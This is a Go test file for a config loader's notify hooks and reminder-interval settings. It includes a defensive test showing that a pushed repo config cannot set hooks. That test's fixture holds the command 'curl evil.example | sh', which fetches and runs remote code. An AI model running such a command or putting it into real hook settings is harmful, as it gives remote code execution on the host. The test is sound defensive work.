package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// writeGlobalFile writes a global config and returns its path. It differs from
// writeGlobal (repo_override_test.go) in that it does not load: the notify tests
// need the failure path too.
func writeGlobalFile(t *testing.T, body string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "config.yaml")
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestLoadGlobal_NotifyHooks(t *testing.T) {
	cfg, err := LoadGlobal(writeGlobalFile(t, `notify:
  on_park: 'echo parked >> /tmp/inbox'
  on_unpark: 'echo resumed >> /tmp/inbox'
  reminder_interval: "5m"
`))
	if err != nil {
		t.Fatalf("LoadGlobal: %v", err)
	}
	if cfg.Notify.OnPark != "echo parked >> /tmp/inbox" {
		t.Errorf("on_park = %q", cfg.Notify.OnPark)
	}
	if cfg.Notify.OnUnpark != "echo resumed >> /tmp/inbox" {
		t.Errorf("on_unpark = %q", cfg.Notify.OnUnpark)
	}
	if cfg.Notify.ReminderInterval != 5*time.Minute {
		t.Errorf("reminder_interval = %v, want 5m", cfg.Notify.ReminderInterval)
	}
}

// An unset notify block still reminds: a park nobody hears about is the failure
// this exists to prevent, so the re-send is on by default and opting out is
// explicit.
func TestLoadGlobal_ReminderIntervalDefaultsOn(t *testing.T) {
	cfg, err := LoadGlobal(filepath.Join(t.TempDir(), "missing.yaml"))
	if err != nil {
		t.Fatalf("LoadGlobal: %v", err)
	}
	if cfg.Notify.ReminderInterval != DefaultReminderInterval {
		t.Fatalf("default reminder_interval = %v, want %v", cfg.Notify.ReminderInterval, DefaultReminderInterval)
	}
}

// The template documents the default cadence to the user. A template that
// disagrees with the code is a template that lies.
func TestDefaultConfigYAML_NotifyBlockMatchesTheGoDefault(t *testing.T) {
	const documented = "10m"
	if !strings.Contains(defaultConfigYAML, `reminder_interval: "`+documented+`"`) {
		t.Fatalf("defaultConfigYAML does not document a reminder_interval of %q", documented)
	}
	d, err := parseReminderInterval(documented)
	if err != nil {
		t.Fatalf("the documented reminder_interval does not parse: %v", err)
	}
	if d != DefaultReminderInterval {
		t.Fatalf("defaultConfigYAML documents %v, Go default is %v", d, DefaultReminderInterval)
	}
}

func TestLoadGlobal_ReminderIntervalCanBeDisabled(t *testing.T) {
	for _, value := range []string{"off", "none", "never", "0s"} {
		cfg, err := LoadGlobal(writeGlobalFile(t, "notify:\n  reminder_interval: \""+value+"\"\n"))
		if err != nil {
			t.Fatalf("LoadGlobal(%q): %v", value, err)
		}
		if cfg.Notify.ReminderInterval != 0 {
			t.Errorf("reminder_interval %q = %v, want disabled", value, cfg.Notify.ReminderInterval)
		}
	}
}

func TestLoadGlobal_InvalidReminderIntervalIsAnError(t *testing.T) {
	if _, err := LoadGlobal(writeGlobalFile(t, "notify:\n  reminder_interval: \"soon\"\n")); err == nil {
		t.Fatal("an unparseable reminder_interval loaded without error")
	}
}

// The security guard: notify hooks are shell commands, and the repo config comes
// from a PUSHED BRANCH. A repo-settable hook would be an `sh -c` on the daemon
// host for anyone who can push - the same line commands.* draws. RepoConfig must
// therefore have no way to carry one, and a pushed .no-mistakes.yaml naming
// notify must have no effect on anything.
func TestRepoConfig_CannotCarryNotifyHooks(t *testing.T) {
	pushed, err := LoadRepoFromBytes([]byte(`notify:
  on_park: "curl evil.example | sh"
  on_unpark: "curl evil.example | sh"
  reminder_interval: "1s"
commands:
  test: "go test ./..."
`))
	if err != nil {
		t.Fatalf("LoadRepoFromBytes: %v", err)
	}

	// The resolved config a run executes with has no notify surface at all: the
	// only Notify lives on GlobalConfig, which no pushed branch can write.
	effective := EffectiveRepoConfig(pushed, nil, true)
	_ = effective // compile-time proof: config.Config has no Notify field to set.

	// And the global config is the only source of hooks.
	global, err := LoadGlobal(writeGlobalFile(t, "notify:\n  on_park: 'echo ok'\n"))
	if err != nil {
		t.Fatalf("LoadGlobal: %v", err)
	}
	if global.Notify.OnPark != "echo ok" {
		t.Fatalf("global on_park = %q", global.Notify.OnPark)
	}
}
